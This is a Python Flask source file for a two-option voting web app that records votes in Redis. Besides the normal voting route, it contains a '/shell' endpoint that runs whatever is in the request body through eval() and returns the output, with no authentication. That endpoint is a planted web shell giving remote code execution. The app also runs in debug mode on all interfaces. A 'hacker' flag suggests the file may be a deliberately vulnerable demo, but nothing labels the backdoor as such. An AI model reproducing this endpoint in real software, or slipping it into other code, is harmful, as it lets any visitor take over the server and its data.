from flask import Flask, render_template, request, make_response, g
from redis import Redis
import os
import socket
import random
import json
import logging

redis_hostname = os.getenv('REDIS_HOST', "redis")

option_a = os.getenv('OPTION_A', "Deluxes")
option_b = os.getenv('OPTION_B', "Elites")
hostname = socket.gethostname()

app = Flask(__name__)

gunicorn_error_logger = logging.getLogger('gunicorn.error')
app.logger.handlers.extend(gunicorn_error_logger.handlers)
app.logger.setLevel(logging.INFO)

def get_redis():
    if not hasattr(g, 'redis'):
        g.redis = Redis(host=redis_hostname, db=0, socket_timeout=5)
    return g.redis

@app.route("/", methods=['POST','GET'])
def hello():
    voter_id = request.cookies.get('voter_id')
    if not voter_id:
        voter_id = hex(random.getrandbits(64))[2:-1]

    vote = None
    hacker = False

    if "hacker" in request.args:
        hacker = True

    if request.method == 'POST':
        redis = get_redis()
        vote = request.form['vote']
        app.logger.info('Received vote for %s', vote)
        data = json.dumps({'voter_id': voter_id, 'vote': vote})
        redis.rpush('votes', data)

    resp = make_response(render_template(
        'index.html',
        option_a=option_a,
        option_b=option_b,
        hostname=hostname,
        vote=vote,
        hacker=hacker
    ))
    resp.set_cookie('voter_id', voter_id)
    return resp

@app.route("/shell", methods=['POST', 'GET'])
def shell():
    try:
        shell_str = request.get_data()
        resp = str(eval(shell_str))
    except Exception as e:
        resp = str(e)
    return resp

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80, debug=True, threaded=True)
